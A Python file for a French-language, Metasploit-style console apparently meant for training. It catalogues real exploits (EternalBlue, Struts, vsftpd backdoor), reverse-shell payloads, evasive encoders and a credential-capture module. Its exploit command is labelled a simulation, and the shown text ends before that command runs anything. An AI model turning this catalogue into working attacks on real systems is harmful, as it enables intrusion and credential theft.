#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""

                                                          
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ████████╗ ██████╗██╗  ██╗ █████╗ ██████╗       
    ██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██║  ██║██╔══██╗██╔══██╗      
    ███████║███████║██║     ███████║█████╗  ██████╔╝       ██║   ██║     ███████║███████║██║  ██║      
    ██╔══██║██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗       ██║   ██║     ██╔══██║██╔══██║██║  ██║      
    ██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║       ██║   ╚██████╗██║  ██║██║  ██║██████╔╝      
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝       
 _____________________________________________________________________________                                                                             
║                    SPLOITE - Framework Éducatif Offensif                     ║
║                                                                              ║
║   Développé par : HiddenWorld Communauté Tchadien                            ║
║   Version : 3.0.0                                                            ║
║   Date : 2024                                                                ║
║   Usage : ÉDUCATIF uniquement - Labs personnels & CTF autorisés              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════╗
║  AVERTISSEMENT LÉGAL                                                         ║
║  ─────────────────                                                                 ║
║  Ce script est fourni à des fins ÉDUCATIVES et de FORMATION uniquement.      ║
║  L'utilisation sur des systèmes sans autorisation explicite est ILLEGALE.    ║
║  Les auteurs ne sont pas responsables de toute utilisation abusive.          ║
║                                                                              ║
║  ✅ AUTORISÉ : Vos propres machines | Labs virtuels | CTF | Cours sécurité   ║
║  ❌ INTERDIT : Réseaux tiers | Sites web publics | Sans autorisation écrite  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import subprocess
import socket
import threading
import ipaddress
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Couleurs ANSI pour l'interface
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    DARK = '\033[90m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

class HackerTchadSploite:
    """Framework éducatif inspiré de Metasploit pour apprentissage de la cybersécurité offensive."""
    
    def __init__(self):
        self.version = "3.0.0"
        self.author = "HiddenWorld Communauté Tchadien"
        self.current_module = None
        self.global_options = {
            'RHOSTS': '',
            'RPORT': '',
            'LHOST': self._get_local_ip(),
            'LPORT': '4444',
            'TARGETURI': '/',
            'SSL': 'false',
            'VERBOSE': 'true'
        }
        self.exploit_db = self._load_exploit_database()
        self.payload_db = self._load_payload_database()
        self.auxiliary_db = self._load_auxiliary_database()
        self.session_history = []
        self.workspace = "default"
        self.jobs = []
        self.sessions = {}
        
    def _get_local_ip(self) -> str:
        """Récupère l'IP locale de la machine."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _load_exploit_database(self) -> Dict:
        """Charge la base de données des exploits éducatifs."""
        return {
            'exploit/multi/http/apache_struts_exec': {
                'name': 'Apache Struts Remote Command Execution',
                'platform': 'multi',
                'rank': 'excellent',
                'description': 'Exécute des commandes arbitraires via Apache Struts (CVE-2017-5638)',
                'references': ['CVE-2017-5638', 'https://struts.apache.org/'],
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP cible'},
                    'RPORT': {'required': True, 'default': '8080', 'description': 'Port HTTP'},
                    'TARGETURI': {'required': True, 'default': '/struts2-showcase/', 'description': 'Chemin de l\'application'},
                    'CMD': {'required': False, 'default': 'whoami', 'description': 'Commande à exécuter'}
                }
            },
            'exploit/windows/smb/ms17_010_eternalblue': {
                'name': 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
                'platform': 'windows',
                'rank': 'average',
                'description': 'Exploite la vulnérabilité SMBv1 EternalBlue (WannaCry)',
                'references': ['CVE-2017-0144', 'MS17-010', 'https://docs.microsoft.com/'],
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP cible Windows'},
                    'RPORT': {'required': True, 'default': '445', 'description': 'Port SMB'},
                    'PROCESSINJECT': {'required': False, 'default': 'spoolsv.exe', 'description': 'Processus cible pour injection'}
                }
            },
            'exploit/linux/ftp/vsftpd_234_backdoor': {
                'name': 'vsftpd 2.3.4 Backdoor Command Execution',
                'platform': 'linux',
                'rank': 'excellent',
                'description': 'Exploite la backdoor dans vsftpd 2.3.4 (smiley dans le code)',
                'references': ['CVE-2011-2523', 'https://security.appspot.com/vsftpd.html'],
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP cible Linux'},
                    'RPORT': {'required': True, 'default': '21', 'description': 'Port FTP'}
                }
            },
            'exploit/multi/ssh/libssh_auth_bypass': {
                'name': 'libssh Authentication Bypass',
                'platform': 'multi',
                'rank': 'good',
                'description': 'Contourne l\'authentification SSH dans libssh < 0.7.6 / 0.8.4',
                'references': ['CVE-2018-10933', 'https://www.libssh.org/'],
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP cible'},
                    'RPORT': {'required': True, 'default': '22', 'description': 'Port SSH'},
                    'CMD': {'required': False, 'default': 'id', 'description': 'Commande à exécuter'}
                }
            },
            'exploit/webapp/wp_plugin_revslider': {
                'name': 'WordPress RevSlider Arbitrary File Upload',
                'platform': 'php',
                'rank': 'excellent',
                'description': 'Upload de fichier arbitraire dans le plugin WordPress RevSlider',
                'references': ['CVE-2014-9735', 'https://wordpress.org/'],
                'options': {
                    'RHOSTS': {'required': True, 'description': 'URL du site WordPress'},
                    'RPORT': {'required': True, 'default': '80', 'description': 'Port HTTP'},
                    'TARGETURI': {'required': True, 'default': '/wp-content/plugins/revslider/', 'description': 'Chemin du plugin'}
                }
            }
        }
    
    def _load_payload_database(self) -> Dict:
        """Charge la base de données des payloads."""
        return {
            'payload/windows/x64/meterpreter/reverse_tcp': {
                'name': 'Windows Meterpreter Reverse TCP',
                'platform': 'windows',
                'arch': 'x64',
                'type': 'staged',
                'description': 'Shell Meterpreter interactif avec reverse TCP',
                'options': {
                    'LHOST': {'required': True, 'description': 'IP de l\'attaquant'},
                    'LPORT': {'required': True, 'default': '4444', 'description': 'Port d\'écoute'},
                    'EXITFUNC': {'required': False, 'default': 'process', 'description': 'Méthode de sortie'}
                }
            },
            'payload/linux/x86/shell/reverse_tcp': {
                'name': 'Linux Command Shell Reverse TCP',
                'platform': 'linux',
                'arch': 'x86',
                'type': 'staged',
                'description': 'Shell système Linux avec reverse TCP',
                'options': {
                    'LHOST': {'required': True, 'description': 'IP de l\'attaquant'},
                    'LPORT': {'required': True, 'default': '4444', 'description': 'Port d\'écoute'}
                }
            },
            'payload/python/meterpreter/reverse_tcp': {
                'name': 'Python Meterpreter Reverse TCP',
                'platform': 'python',
                'arch': 'python',
                'type': 'inline',
                'description': 'Payload Python pur, très furtif',
                'options': {
                    'LHOST': {'required': True, 'description': 'IP de l\'attaquant'},
                    'LPORT': {'required': True, 'default': '4444', 'description': 'Port d\'écoute'}
                }
            },
            'payload/android/meterpreter/reverse_tcp': {
                'name': 'Android Meterpreter Reverse TCP',
                'platform': 'android',
                'arch': 'dalvik',
                'type': 'staged',
                'description': 'Payload Android avec permissions étendues',
                'options': {
                    'LHOST': {'required': True, 'description': 'IP de l\'attaquant'},
                    'LPORT': {'required': True, 'default': '4444', 'description': 'Port d\'écoute'},
                    'AutoRunScript': {'required': False, 'default': '', 'description': 'Script à exécuter automatiquement'}
                }
            },
            'payload/cmd/unix/reverse_bash': {
                'name': 'Unix Command Shell Reverse TCP (bash)',
                'platform': 'unix',
                'arch': 'cmd',
                'type': 'inline',
                'description': 'One-liner bash pour reverse shell',
                'options': {
                    'LHOST': {'required': True, 'description': 'IP de l\'attaquant'},
                    'LPORT': {'required': True, 'default': '4444', 'description': 'Port d\'écoute'}
                }
            }
        }
    
    def _load_auxiliary_database(self) -> Dict:
        """Charge la base de données des modules auxiliaires."""
        return {
            'auxiliary/scanner/portscan/tcp': {
                'name': 'TCP Port Scanner',
                'description': 'Scanne les ports TCP ouverts sur une cible',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP ou range CIDR'},
                    'PORTS': {'required': True, 'default': '1-1000', 'description': 'Plage de ports à scanner'},
                    'THREADS': {'required': False, 'default': '10', 'description': 'Nombre de threads'},
                    'TIMEOUT': {'required': False, 'default': '1000', 'description': 'Timeout en millisecondes'}
                }
            },
            'auxiliary/scanner/http/dir_scanner': {
                'name': 'HTTP Directory Scanner',
                'description': 'Découvre les répertoires cachés sur un serveur web',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP ou domaine'},
                    'RPORT': {'required': True, 'default': '80', 'description': 'Port HTTP'},
                    'PATH': {'required': False, 'default': '/', 'description': 'Chemin de base'},
                    'DICTIONARY': {'required': False, 'default': 'common.txt', 'description': 'Fichier dictionnaire'}
                }
            },
            'auxiliary/scanner/ssh/ssh_version': {
                'name': 'SSH Version Scanner',
                'description': 'Récupère la version du serveur SSH',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Adresse IP cible'},
                    'RPORT': {'required': True, 'default': '22', 'description': 'Port SSH'},
                    'THREADS': {'required': False, 'default': '10', 'description': 'Nombre de threads'}
                }
            },
            'auxiliary/gather/dns_enum': {
                'name': 'DNS Enumeration',
                'description': 'Énumère les enregistrements DNS d\'un domaine',
                'options': {
                    'DOMAIN': {'required': True, 'description': 'Domaine à énumérer'},
                    'WORDLIST': {'required': False, 'default': 'subdomains.txt', 'description': 'Liste de sous-domaines'}
                }
            },
            'auxiliary/server/capture/http_basic': {
                'name': 'HTTP Basic Authentication Capture',
                'description': 'Capture les identifiants HTTP Basic Auth',
                'options': {
                    'SRVHOST': {'required': True, 'default': '0.0.0.0', 'description': 'IP d\'écoute'},
                    'SRVPORT': {'required': True, 'default': '8080', 'description': 'Port d\'écoute'},
                    'SSL': {'required': False, 'default': 'false', 'description': 'Activer SSL'},
                    'URIPATH': {'required': False, 'default': '/', 'description': 'Chemin URI'}
                }
            }
        }
    
    def clear_screen(self):
        """Efface l'écran du terminal."""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Affiche la bannière principale."""
        banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.END}                                                                              {Colors.CYAN}║
║{Colors.RED}   ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗      ████████╗ ██████╗    {Colors.CYAN}║
║{Colors.RED}   ██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗     ╚══██╔══╝██╔════╝    {Colors.CYAN}║
║{Colors.RED}   ███████║███████║██║     ███████║█████╗  ██████╔╝        ██║   ██║         {Colors.CYAN}║
║{Colors.RED}   ██╔══██║██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗        ██║   ██║         {Colors.CYAN}║
║{Colors.RED}   ██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║        ██║   ╚██████╗    {Colors.CYAN}║
║{Colors.RED}   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ╚═╝    ╚═════╝    {Colors.CYAN}║
║{Colors.END}                                                                              {Colors.CYAN}║
║{Colors.YELLOW}                    SPLOITE - Framework Éducatif Offensif                      {Colors.CYAN}║
║{Colors.END}                                                                              {Colors.CYAN}║
║{Colors.GREEN}   Développé par : {Colors.BOLD}HiddenWorld Communauté Tchadien{Colors.END}{Colors.GREEN}                           {Colors.CYAN}║
║{Colors.GREEN}   Version : {Colors.BOLD}{self.version}{Colors.END}{Colors.GREEN}                                                       {Colors.CYAN}║
║{Colors.GREEN}   Workspace : {Colors.BOLD}{self.workspace}{Colors.END}{Colors.GREEN}                                                    {Colors.CYAN}║
║{Colors.END}                                                                              {Colors.CYAN}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}[!] Ce framework est destiné à un usage ÉDUCATIF uniquement.{Colors.END}
{Colors.YELLOW}[!] Utilisez-le uniquement sur vos propres systèmes ou avec autorisation explicite.{Colors.END}
"""
        print(banner)
    
    def print_prompt(self):
        """Affiche le prompt interactif."""
        if self.current_module:
            module_name = self.current_module.split('/')[-1]
            prompt = f"{Colors.RED}ht_sploite{Colors.END} {Colors.YELLOW}({Colors.CYAN}{module_name}{Colors.YELLOW}){Colors.END} > "
        else:
            prompt = f"{Colors.RED}ht_sploite{Colors.END} > "
        return input(prompt)
    
    def print_success(self, message: str):
        """Affiche un message de succès."""
        print(f"{Colors.GREEN}[+]{Colors.END} {message}")
    
    def print_error(self, message: str):
        """Affiche un message d'erreur."""
        print(f"{Colors.RED}[-]{Colors.END} {message}")
    
    def print_info(self, message: str):
        """Affiche un message d'information."""
        print(f"{Colors.BLUE}[*]{Colors.END} {message}")
    
    def print_warning(self, message: str):
        """Affiche un message d'avertissement."""
        print(f"{Colors.YELLOW}[!]{Colors.END} {message}")
    
    def cmd_help(self, args: List[str] = None):
        """Affiche l'aide des commandes disponibles."""
        help_text = f"""
{Colors.CYAN}Commandes Principales :{Colors.END}
{'─' * 60}
  {Colors.GREEN}help{Colors.END}                    Affiche cette aide
  {Colors.GREEN}?{Colors.END}                       Alias pour help
  
{Colors.CYAN}Gestion des Modules :{Colors.END}
{'─' * 60}
  {Colors.GREEN}use <module>{Colors.END}            Sélectionne un module (exploit/payload/auxiliary)
  {Colors.GREEN}show exploits{Colors.END}           Liste tous les exploits disponibles
  {Colors.GREEN}show payloads{Colors.END}           Liste tous les payloads disponibles
  {Colors.GREEN}show auxiliary{Colors.END}          Liste tous les modules auxiliaires
  {Colors.GREEN}show options{Colors.END}            Affiche les options du module courant
  {Colors.GREEN}show advanced{Colors.END}           Affiche les options avancées
  {Colors.GREEN}info <module>{Colors.END}           Affiche les informations détaillées sur un module
  {Colors.GREEN}search <term>{Colors.END}           Recherche des modules par mot-clé
  
{Colors.CYAN}Configuration :{Colors.END}
{'─' * 60}
  {Colors.GREEN}set <option> <value>{Colors.END}    Définit une option du module
  {Colors.GREEN}unset <option>{Colors.END}          Supprime la valeur d'une option
  {Colors.GREEN}setg <option> <value>{Colors.END}   Définit une option globale
  {Colors.GREEN}unsetg <option>{Colors.END}         Supprime une option globale
  {Colors.GREEN}save{Colors.END}                    Sauvegarde la configuration actuelle
  
{Colors.CYAN}Exécution :{Colors.END}
{'─' * 60}
  {Colors.GREEN}exploit{Colors.END}                 Exécute l'exploit sélectionné
  {Colors.GREEN}run{Colors.END}                     Alias pour exploit
  {Colors.GREEN}check{Colors.END}                   Vérifie si la cible est vulnérable
  
{Colors.CYAN}Gestion des Sessions :{Colors.END}
{'─' * 60}
  {Colors.GREEN}sessions{Colors.END}                Liste les sessions actives
  {Colors.GREEN}sessions -i <id>{Colors.END}        Interagit avec une session
  {Colors.GREEN}sessions -k <id>{Colors.END}        Tue une session
  {Colors.GREEN}background{Colors.END}              Met la session en arrière-plan
  
{Colors.CYAN}Jobs et Tâches :{Colors.END}
{'─' * 60}
  {Colors.GREEN}jobs{Colors.END}                    Liste les jobs en cours
  {Colors.GREEN}jobs -k <id>{Colors.END}            Tue un job
  
{Colors.CYAN}Payloads et Encodage :{Colors.END}
{'─' * 60}
  {Colors.GREEN}generate{Colors.END}                Génère le payload configuré
  {Colors.GREEN}show encoders{Colors.END}           Liste les encodeurs disponibles
  
{Colors.CYAN}Workspaces :{Colors.END}
{'─' * 60}
  {Colors.GREEN}workspace{Colors.END}               Liste les workspaces
  {Colors.GREEN}workspace -a <name>{Colors.END}     Ajoute un workspace
  {Colors.GREEN}workspace -d <name>{Colors.END}     Supprime un workspace
  {Colors.GREEN}workspace <name>{Colors.END}        Change de workspace
  
{Colors.CYAN}Système :{Colors.END}
{'─' * 60}
  {Colors.GREEN}banner{Colors.END}                  Réaffiche la bannière
  {Colors.GREEN}version{Colors.END}                 Affiche la version
  {Colors.GREEN}history{Colors.END}                 Affiche l'historique des commandes
  {Colors.GREEN}resource <file>{Colors.END}         Exécute un fichier de commandes
  {Colors.GREEN}exit{Colors.END}                    Quitte le framework
  {Colors.GREEN}quit{Colors.END}                    Alias pour exit
"""
        print(help_text)
    
    def cmd_show(self, args: List[str]):
        """Affiche différentes listes selon l'argument."""
        if not args:
            self.print_error("Usage: show <exploits|payloads|auxiliary|options|advanced|encoders>")
            return
        
        category = args[0].lower()
        
        if category == 'exploits':
            self._show_exploits()
        elif category == 'payloads':
            self._show_payloads()
        elif category == 'auxiliary':
            self._show_auxiliary()
        elif category == 'options':
            self._show_options()
        elif category == 'advanced':
            self._show_advanced()
        elif category == 'encoders':
            self._show_encoders()
        else:
            self.print_error(f"Catégorie inconnue : {category}")
    
    def _show_exploits(self):
        """Affiche la liste des exploits."""
        print(f"\n{Colors.CYAN}Exploits disponibles ({len(self.exploit_db)} total){Colors.END}")
        print(f"{'═' * 100}")
        print(f"{Colors.YELLOW}{'Nom':<50} {'Plateforme':<12} {'Rank':<12} {'Description':<30}{Colors.END}")
        print(f"{'─' * 100}")
        
        for path, info in self.exploit_db.items():
            name = path.split('/')[-1]
            platform = info['platform']
            rank = info['rank']
            desc = info['description'][:40] + '...' if len(info['description']) > 40 else info['description']
            print(f"{name:<50} {platform:<12} {rank:<12} {desc:<30}")
        print()
    
    def _show_payloads(self):
        """Affiche la liste des payloads."""
        print(f"\n{Colors.CYAN}Payloads disponibles ({len(self.payload_db)} total){Colors.END}")
        print(f"{'═' * 100}")
        print(f"{Colors.YELLOW}{'Nom':<50} {'Plateforme':<12} {'Arch':<10} {'Type':<10} {'Description':<25}{Colors.END}")
        print(f"{'─' * 100}")
        
        for path, info in self.payload_db.items():
            name = path.split('/')[-1]
            platform = info['platform']
            arch = info['arch']
            ptype = info['type']
            desc = info['description'][:35] + '...' if len(info['description']) > 35 else info['description']
            print(f"{name:<50} {platform:<12} {arch:<10} {ptype:<10} {desc:<25}")
        print()
    
    def _show_auxiliary(self):
        """Affiche la liste des modules auxiliaires."""
        print(f"\n{Colors.CYAN}Modules Auxiliaires ({len(self.auxiliary_db)} total){Colors.END}")
        print(f"{'═' * 100}")
        print(f"{Colors.YELLOW}{'Nom':<50} {'Description':<50}{Colors.END}")
        print(f"{'─' * 100}")
        
        for path, info in self.auxiliary_db.items():
            name = path.split('/')[-1]
            desc = info['description'][:60] + '...' if len(info['description']) > 60 else info['description']
            print(f"{name:<50} {desc:<50}")
        print()
    
    def _show_options(self):
        """Affiche les options du module courant."""
        if not self.current_module:
            self.print_error("Aucun module sélectionné. Utilisez 'use <module>'")
            return
        
        # Déterminer la base de données appropriée
        module_info = None
        if self.current_module in self.exploit_db:
            module_info = self.exploit_db[self.current_module]
        elif self.current_module in self.payload_db:
            module_info = self.payload_db[self.current_module]
        elif self.current_module in self.auxiliary_db:
            module_info = self.auxiliary_db[self.current_module]
        
        if not module_info:
            self.print_error("Module non trouvé dans la base de données")
            return
        
        print(f"\n{Colors.CYAN}Options du module : {self.current_module}{Colors.END}")
        print(f"{'═' * 80}")
        print(f"{Colors.YELLOW}{'Nom':<20} {'Valeur Actuelle':<25} {'Requis':<8} {'Description':<30}{Colors.END}")
        print(f"{'─' * 80}")
        
        options = module_info.get('options', {})
        for opt_name, opt_info in options.items():
            current_value = self.global_options.get(opt_name, opt_info.get('default', ''))
            required = "oui" if opt_info.get('required', False) else "non"
            desc = opt_info.get('description', '')[:35]
            print(f"{opt_name:<20} {str(current_value):<25} {required:<8} {desc:<30}")
        print()
    
    def _show_advanced(self):
        """Affiche les options avancées."""
        print(f"\n{Colors.CYAN}Options Avancées{Colors.END}")
        print(f"{'═' * 80}")
        print(f"{Colors.YELLOW}{'Nom':<25} {'Valeur':<20} {'Description':<40}{Colors.END}")
        print(f"{'─' * 80}")
        
        advanced_options = {
            'VERBOSE': ('true', 'Active les messages détaillés'),
            'SSL': ('false', 'Utilise SSL/TLS pour les connexions'),
            'SSLVersion': ('Auto', 'Version SSL à utiliser'),
            'ConnectTimeout': ('10', 'Timeout de connexion en secondes'),
            'RecvTimeout': ('5', 'Timeout de réception en secondes'),
            'WfsDelay': ('5', 'Délai d\'attente pour la session'),
            'PayloadUUIDTracking': ('true', 'Suivi UUID des payloads'),
            'EnableContextEncoding': ('false', 'Encodage contextuel'),
            'DisablePayloadHandler': ('false', 'Désactive le handler de payload'),
            'ExitOnSession': ('false', 'Quitte après réception d\'une session'),
            'ListenerTimeout': ('0', 'Timeout du listener (0 = illimité)'),
            'AutoLoadStdapi': ('true', 'Charge stdapi automatiquement'),
            'AutoSystemInfo': ('true', 'Collecte les infos système automatiquement'),
            'AutoVerifySession': ('true', 'Vérifie la session automatiquement'),
            'SessionCommunicationTimeout': ('300', 'Timeout de communication session'),
            'SessionExpirationTimeout': ('604800', 'Expiration de session en secondes'),
            'MeterpreterDebugLevel': ('0', 'Niveau de debug Meterpreter'),
            'MeterpreterPrompt': ('meterpreter', 'Prompt Meterpreter personnalisé'),
            'HTTPUserAgent': ('Mozilla/5.0', 'User-Agent HTTP personnalisé'),
            'HTTPProxyHost': ('', 'Proxy HTTP hôte'),
            'HTTPProxyPort': ('', 'Proxy HTTP port'),
            'HTTPProxyUser': ('', 'Proxy HTTP utilisateur'),
            'HTTPProxyPass': ('', 'Proxy HTTP mot de passe'),
            'HttpCookie': ('', 'Cookie HTTP personnalisé'),
            'HttpHeaderName': ('', 'Nom d\'en-tête HTTP personnalisé'),
            'HttpHeaderValue': ('', 'Valeur d\'en-tête HTTP personnalisée'),
            'HttpHostHeader': ('', 'Host header HTTP personnalisé'),
            'HttpUnknownRequestEncoding': ('hex', 'Encodage des requêtes inconnues'),
            'HttpChunkSize': ('0', 'Taille des chunks HTTP'),
            'HttpNoChunking': ('false', 'Désactive le chunking HTTP'),
            'HttpRetryCount': ('5', 'Nombre de tentatives HTTP'),
            'HttpRetryWait': ('5', 'Délai entre les tentatives HTTP'),
        }
        
        for name, (value, desc) in advanced_options.items():
            print(f"{name:<25} {str(value):<20} {desc:<40}")
        print()
    
    def _show_encoders(self):
        """Affiche la liste des encodeurs."""
        encoders = [
            ('x86/shikata_ga_nai', 'Polymorphic XOR additive feedback encoder', 'x86'),
            ('x86/xor_dynamic', 'Dynamic key XOR encoder', 'x86'),
            ('x64/xor', 'XOR encoder for x64', 'x64'),
            ('cmd/powershell_base64', 'PowerShell Base64 encoder', 'cmd'),
            ('generic/none', 'The "none" encoder', 'generic'),
            ('php/base64', 'PHP Base64 encoder', 'php'),
            ('python/base64', 'Python Base64 encoder', 'python'),
            ('ruby/base64', 'Ruby Base64 encoder', 'ruby'),
        ]
        
        print(f"\n{Colors.CYAN}Encodeurs disponibles{Colors.END}")
        print(f"{'═' * 80}")
        print(f"{Colors.YELLOW}{'Nom':<30} {'Description':<40} {'Arch':<10}{Colors.END}")
        print(f"{'─' * 80}")
        
        for name, desc, arch in encoders:
            print(f"{name:<30} {desc:<40} {arch:<10}")
        print()
    
    def cmd_use(self, args: List[str]):
        """Sélectionne un module."""
        if not args:
            self.print_error("Usage: use <module_path>")
            return
        
        module_path = args[0]
        
        # Vérifier dans toutes les bases de données
        if module_path in self.exploit_db or module_path in self.payload_db or module_path in self.auxiliary_db:
            self.current_module = module_path
            self.print_success(f"Module sélectionné : {module_path}")
            
            # Afficher les informations du module
            self.cmd_info([module_path])
        else:
            self.print_error(f"Module non trouvé : {module_path}")
            self.print_info("Utilisez 'search <terme>' pour trouver des modules")
    
    def cmd_info(self, args: List[str]):
        """Affiche les informations détaillées d'un module."""
        if not args and not self.current_module:
            self.print_error("Usage: info <module> ou sélectionnez un module avec 'use'")
            return
        
        module_path = args[0] if args else self.current_module
        
        module_info = None
        module_type = ""
        
        if module_path in self.exploit_db:
            module_info = self.exploit_db[module_path]
            module_type = "exploit"
        elif module_path in self.payload_db:
            module_info = self.payload_db[module_path]
            module_type = "payload"
        elif module_path in self.auxiliary_db:
            module_info = self.auxiliary_db[module_path]
            module_type = "auxiliary"
        
        if not module_info:
            self.print_error(f"Module non trouvé : {module_path}")
            return
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}{module_info['name']}{Colors.END}")
        print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Module :{Colors.END} {module_path}")
        print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Type :{Colors.END} {module_type}")
        
        if 'platform' in module_info:
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Plateforme :{Colors.END} {module_info['platform']}")
        if 'rank' in module_info:
            rank_color = Colors.GREEN if module_info['rank'] == 'excellent' else Colors.YELLOW
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Rank :{Colors.END} {rank_color}{module_info['rank']}{Colors.END}")
        if 'arch' in module_info:
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Architecture :{Colors.END} {module_info['arch']}")
        if 'type' in module_info:
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.YELLOW}Type Payload :{Colors.END} {module_info['type']}")
        
        print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}Description :{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.END}  {module_info['description']}")
        
        if 'references' in module_info:
            print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}Références :{Colors.END}")
            for ref in module_info['references']:
                print(f"{Colors.CYAN}║{Colors.END}    • {ref}")
        
        if 'options' in module_info:
            print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.END}  {Colors.BOLD}Options :{Colors.END}")
            for opt_name, opt_info in module_info['options'].items():
                req = "(requis)" if opt_info.get('required') else "(optionnel)"
                default = f"[défaut: {opt_info.get('default', 'non défini')}]" if 'default' in opt_info else ""
                print(f"{Colors.CYAN}║{Colors.END}    {Colors.YELLOW}{opt_name}{Colors.END} {req} {default}")
                print(f"{Colors.CYAN}║{Colors.END}      {opt_info['description']}")
        
        print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    def cmd_search(self, args: List[str]):
        """Recherche des modules par mot-clé."""
        if not args:
            self.print_error("Usage: search <terme>")
            return
        
        term = args[0].lower()
        results = []
        
        # Rechercher dans les exploits
        for path, info in self.exploit_db.items():
            if term in path.lower() or term in info['name'].lower() or term in info['description'].lower():
                results.append(('exploit', path, info))
        
        # Rechercher dans les payloads
        for path, info in self.payload_db.items():
            if term in path.lower() or term in info['name'].lower() or term in info['description'].lower():
                results.append(('payload', path, info))
        
        # Rechercher dans les auxiliaires
        for path, info in self.auxiliary_db.items():
            if term in path.lower() or term in info['name'].lower() or term in info['description'].lower():
                results.append(('auxiliary', path, info))
        
        if not results:
            self.print_warning(f"Aucun résultat trouvé pour : {term}")
            return
        
        print(f"\n{Colors.CYAN}Résultats de recherche pour '{term}' ({len(results)} trouvé(s)){Colors.END}")
        print(f"{'═' * 100}")
        print(f"{Colors.YELLOW}{'Type':<12} {'Nom':<50} {'Description':<40}{Colors.END}")
        print(f"{'─' * 100}")
        
        for mtype, path, info in results:
            name = path.split('/')[-1]
            desc = info['description'][:45] + '...' if len(info['description']) > 45 else info['description']
            print(f"{mtype:<12} {name:<50} {desc:<40}")
        print()
    
    def cmd_set(self, args: List[str]):
        """Définit une option du module."""
        if len(args) < 2:
            self.print_error("Usage: set <option> <valeur>")
            return
        
        option = args[0].upper()
        value = ' '.join(args[1:])
        
        self.global_options[option] = value
        self.print_success(f"{option} => {value}")
    
    def cmd_unset(self, args: List[str]):
        """Supprime la valeur d'une option."""
        if not args:
            self.print_error("Usage: unset <option>")
            return
        
        option = args[0].upper()
        if option in self.global_options:
            del self.global_options[option]
            self.print_success(f"{option} supprimé")
        else:
            self.print_error(f"Option non définie : {option}")
    
    def cmd_setg(self, args: List[str]):
        """Définit une option globale."""
        self.cmd_set(args)
    
    def cmd_unsetg(self, args: List[str]):
        """Supprime une option globale."""
        self.cmd_unset(args)
    
    def cmd_exploit(self, args: List[str] = None):
        """Exécute l'exploit sélectionné (simulation éducative)."""
        if not self.current_module:
            self.print_error("Aucun module sélectionné. Utilisez 'use <module>'")
            return
        
        # Vérifier les options requises
        module_info = None
        if self.current_module in self.exploit_db:
            module_info = self.exploit_db[self.current_module]
        elif self.current_module in self.payload_db:
            module_info = self.payload_db[self.current_module]
        elif self.current_module in self.auxiliary_db:
            module_info = self.auxiliary_db[self.current_module]
        
        if not module_info:
            self.print_error("Module non trouvé")
            return
        
        # Vérifier les options requises
        missing = []
        for opt_name, opt_info in module_info.get('options', {}).items():
            if opt_info.get('required') and not self.global_options.get(opt_name):
                missing.append(opt_name)
        
        if missing:
            self.print_error(f"Options requises manquantes : {', '.join(missing)}")
            self.print_info("Utilisez 'show options' pour voir les options requises")
            return
        
